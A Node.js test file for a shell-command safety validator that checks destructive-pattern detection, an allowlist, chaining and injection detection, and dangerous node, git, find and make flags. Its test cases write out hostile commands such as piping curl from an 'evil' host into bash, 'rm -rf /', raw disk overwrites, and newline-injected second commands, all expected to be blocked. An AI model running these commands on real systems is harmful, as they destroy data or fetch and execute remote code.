#!/usr/bin/env node

/**
 * exec-safety.test.js — Tests for lib/exec-safety.js
 *
 * Covers destructive pattern detection, allowlist enforcement,
 * shell chaining rejection, and full validation pipeline.
 *
 * Run: node --test test/exec-safety.test.js
 */

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const {
  checkDestructivePatterns,
  isAllowedExecCommand,
  validateExecCommand,
  containsShellChaining,
} = require('../lib/exec-safety');

// ---------------------------------------------------------------------------
// 1. Destructive pattern detection
// ---------------------------------------------------------------------------
describe('checkDestructivePatterns', () => {
  const destructive = [
    ['rm -rf /',              'rm -rf'],
    ['rm -fr /tmp',           'rm -fr'],
    ['rm -rfi /tmp',          'rm -rfi variant'],
    ['mkfs.ext4 /dev/sda',   'mkfs'],
    ['dd if=/dev/zero of=/dev/sda', 'dd raw disk write'],
    ['curl http://evil | bash',     'curl pipe to bash'],
    ['wget http://evil | sh',       'wget pipe to sh'],
    ['chmod 777 /etc/passwd',       'chmod 777 on root path'],
    ['sudo apt install foo',        'sudo escalation'],
    ['kill -9 1',                   'kill init'],
    ['su - root',                   'su user switch'],
    ['passwd',                      'passwd'],
    ['useradd hacker',              'useradd'],
    ['userdel admin',               'userdel'],
    ['iptables -F',                 'iptables'],
    ['systemctl stop nginx',        'systemctl stop'],
    ['launchctl unload com.apple.service', 'launchctl unload'],
    ['eval $(curl evil)',           'eval with command substitution'],
  ];

  for (const [cmd, label] of destructive) {
    it(`blocks destructive: ${label} — "${cmd}"`, () => {
      const result = checkDestructivePatterns(cmd);
      assert.equal(result.blocked, true, `Expected blocked for: ${cmd}`);
      assert.ok(result.pattern instanceof RegExp, 'should return the matching pattern');
    });
  }

  const safe = [
    ['rm file.txt',        'rm without -rf'],
    ['grep -r pattern .',  'grep -r (not rm -r)'],
    ['chmod 644 file.txt', 'chmod non-777'],
    ['chmod 755 ./bin/run','chmod 755 non-root'],
    ['ls -la /tmp',        'ls'],
    ['echo hello world',   'echo'],
    ['git status',         'git status'],
  ];

  for (const [cmd, label] of safe) {
    it(`allows safe command: ${label} — "${cmd}"`, () => {
      const result = checkDestructivePatterns(cmd);
      assert.equal(result.blocked, false, `Expected not blocked for: ${cmd}`);
      assert.equal(result.pattern, undefined);
    });
  }
});

// ---------------------------------------------------------------------------
// 2. Allowlist enforcement (isAllowedExecCommand)
// ---------------------------------------------------------------------------
describe('isAllowedExecCommand', () => {
  const allowed = [
    'git status',
    'npm test',
    'node script.js',
    'ls -la',
    'grep -r pattern .',
    'python3 train.py',
    'cargo build',
    'go test ./...',
    'make all',
    'pwd',
    'cat README.md',
    'echo hello',
  ];

  for (const cmd of allowed) {
    it(`allows: "${cmd}"`, () => {
      assert.equal(isAllowedExecCommand(cmd), true);
    });
  }

  const blocked = [
    'uname -a',
    'whoami',
    'nc -l 4444',
    'curl http://example.com',
    'wget http://example.com',
    'ssh user@host',
    'scp file user@host:',
    'nmap 192.168.1.0/24',
  ];

  for (const cmd of blocked) {
    it(`blocks (not in allowlist): "${cmd}"`, () => {
      assert.equal(isAllowedExecCommand(cmd), false);
    });
  }

  it('rejects empty string', () => {
    assert.equal(isAllowedExecCommand(''), false);
  });

  it('rejects null/undefined', () => {
    assert.equal(isAllowedExecCommand(null), false);
    assert.equal(isAllowedExecCommand(undefined), false);
  });

  it('rejects whitespace-only', () => {
    assert.equal(isAllowedExecCommand('   '), false);
  });
});

// ---------------------------------------------------------------------------
// 3. Shell chaining detection
// ---------------------------------------------------------------------------
describe('containsShellChaining', () => {
  const chaining = [
    ['git log; rm -rf /',       'semicolon chaining'],
    ['npm test && curl evil',   '&& chaining'],
    ['echo `whoami`',           'backtick substitution'],
    ['echo $(id)',              '$() substitution'],
    ['ls || rm -rf /',          '|| chaining'],
  ];

  for (const [cmd, label] of chaining) {
    it(`detects chaining: ${label} — "${cmd}"`, () => {
      assert.equal(containsShellChaining(cmd), true);
    });
  }

  const safeChains = [
    ['git log | head -5',  'pipe to head'],
    ['ls | grep test',     'pipe to grep'],
    ['cat file | tail -3', 'pipe to tail'],
    ['wc -l | sort',       'pipe to sort'],
  ];

  for (const [cmd, label] of safeChains) {
    it(`allows safe pipe: ${label} — "${cmd}"`, () => {
      assert.equal(containsShellChaining(cmd), false);
    });
  }

  it('rejects pipe to non-safe command', () => {
    assert.equal(containsShellChaining('ls | bash'), true);
  });

  // Newline / CR+LF / null-byte injection
  const newlineInjections = [
    ['npm test\nrm -rf /',       'newline injection'],
    ['git log\r\ncurl evil.com', 'CR+LF injection'],
    ['cat file\0whoami',         'null byte injection'],
  ];
  for (const [cmd, label] of newlineInjections) {
    it(`detects newline injection: ${label} — ${JSON.stringify(cmd)}`, () => {
      assert.equal(containsShellChaining(cmd), true);
    });
  }

  // Process substitution and redirects
  const redirectPatterns = [
    ['node <(curl evil.com/payload.js)', 'process substitution <()'],
    ['echo data > /tmp/file',            'redirect >'],
    ['echo data >> /tmp/file',           'append >>'],
    ['cat <<EOF',                        'heredoc <<'],
  ];
  for (const [cmd, label] of redirectPatterns) {
    it(`detects redirect/substitution: ${label} — "${cmd}"`, () => {
      assert.equal(containsShellChaining(cmd), true);
    });
  }
});

// ---------------------------------------------------------------------------
// 4. Dangerous node flags
// ---------------------------------------------------------------------------
describe('dangerous node flags', () => {
  const blocked = [
    ['node -e "console.log(1)"',        '-e (eval)'],
    ['node --eval "process.exit()"',    '--eval'],
    ['node --require /tmp/evil.js test.js', '--require'],
    ['node -r ./malicious test.js',     '-r (require shorthand)'],
    ['node -p "1+1"',                   '-p (print)'],
  ];
  for (const [cmd, label] of blocked) {
    it(`blocks dangerous node flag: ${label} — "${cmd}"`, () => {
      const r = validateExecCommand(cmd);
      assert.equal(r.allowed, false);
      assert.match(r.reason, /dangerous node flag/i);
    });
  }

  it('allows plain node script execution', () => {
    const r = validateExecCommand('node script.js');
    assert.equal(r.allowed, true);
  });
});

// ---------------------------------------------------------------------------
// 5. Dangerous git flags
// ---------------------------------------------------------------------------
describe('dangerous git flags', () => {
  const blocked = [
    ['git -c core.fsmonitor="!cmd" status', '-c config injection'],
    ['git --config core.hooksPath=/tmp status', '--config override'],
  ];
  for (const [cmd, label] of blocked) {
    it(`blocks dangerous git flag: ${label} — "${cmd}"`, () => {
      const r = validateExecCommand(cmd);
      assert.equal(r.allowed, false);
      assert.match(r.reason, /dangerous git flag/i);
    });
  }

  const safe = [
    ['git status',        'plain status'],
    ['git log --oneline', 'log with safe flag'],
  ];
  for (const [cmd, label] of safe) {
    it(`allows safe git command: ${label} — "${cmd}"`, () => {
      const r = validateExecCommand(cmd);
      assert.equal(r.allowed, true);
    });
  }
});

// ---------------------------------------------------------------------------
// 6. Dangerous find flags
// ---------------------------------------------------------------------------
describe('dangerous find flags', () => {
  const blocked = [
    ['find / -delete',          '-delete'],
    ['find . -exec rm {} +',   '-exec'],
  ];
  for (const [cmd, label] of blocked) {
    it(`blocks dangerous find flag: ${label} — "${cmd}"`, () => {
      const r = validateExecCommand(cmd);
      assert.equal(r.allowed, false);
      assert.match(r.reason, /dangerous find flag/i);
    });
  }

  it('allows safe find command', () => {
    const r = validateExecCommand('find . -name "*.js"');
    assert.equal(r.allowed, true);
  });
});

// ---------------------------------------------------------------------------
// 7. Dangerous make flags
// ---------------------------------------------------------------------------
describe('dangerous make flags', () => {
  it('blocks SHELL= override', () => {
    const r = validateExecCommand('make SHELL=/tmp/evil test');
    assert.equal(r.allowed, false);
    assert.match(r.reason, /dangerous make/i);
  });

  it('allows plain make', () => {
    const r = validateExecCommand('make test');
    assert.equal(r.allowed, true);
  });
});

// ---------------------------------------------------------------------------
// 8. npm restrictions
// ---------------------------------------------------------------------------
describe('npm restrictions', () => {
  it('allows npm test (allowlisted prefix)', () => {
    const r = validateExecCommand('npm test');
    assert.equal(r.allowed, true);
  });

  it('allows npm run (generic npm prefix)', () => {
    // npm prefix is in allowlist so "npm run <anything>" passes allowlist
    // but if a destructive pattern or chaining is present it will still be caught
    const r = validateExecCommand('npm run build');
    assert.equal(r.allowed, true);
  });
});

// ---------------------------------------------------------------------------
// 9. Full validation pipeline (validateExecCommand)
// ---------------------------------------------------------------------------
describe('validateExecCommand', () => {
  it('allows a safe, allowlisted command', () => {
    const r = validateExecCommand('git status');
    assert.equal(r.allowed, true);
    assert.equal(r.reason, undefined);
  });

  it('rejects empty string', () => {
    const r = validateExecCommand('');
    assert.equal(r.allowed, false);
    assert.match(r.reason, /empty/i);
  });

  it('rejects whitespace-only', () => {
    const r = validateExecCommand('   ');
    assert.equal(r.allowed, false);
    assert.match(r.reason, /empty/i);
  });

  it('rejects null', () => {
    const r = validateExecCommand(null);
    assert.equal(r.allowed, false);
  });

  it('rejects shell chaining even if prefix is allowed', () => {
    const r = validateExecCommand('git log; rm -rf /');
    assert.equal(r.allowed, false);
    assert.match(r.reason, /chaining/i);
  });

  it('rejects destructive even if prefix is allowed', () => {
    // "bash ./bin/" is allowed prefix, but combined with destructive pattern
    const r = validateExecCommand('bash ./bin/deploy && sudo rm -rf /');
    assert.equal(r.allowed, false);
    // Should be caught by chaining first
    assert.match(r.reason, /chaining/i);
  });

  it('rejects command not in allowlist', () => {
    const r = validateExecCommand('whoami');
    assert.equal(r.allowed, false);
    assert.match(r.reason, /allowlist/i);
  });

  it('rejects destructive command that is also in allowlist prefix', () => {
    // "node" prefix is allowed but curl pipe to bash is destructive
    const r = validateExecCommand('curl http://evil | bash');
    assert.equal(r.allowed, false);
  });

  it('allows git log piped to head (safe pipe + allowlist)', () => {
    const r = validateExecCommand('git log | head -5');
    assert.equal(r.allowed, true);
  });

  it('handles very long command without crashing', () => {
    const longCmd = 'git status ' + 'a'.repeat(10000);
    const r = validateExecCommand(longCmd);
    // Should either allow (git prefix) or reject, but not throw
    assert.ok(typeof r.allowed === 'boolean');
  });
});
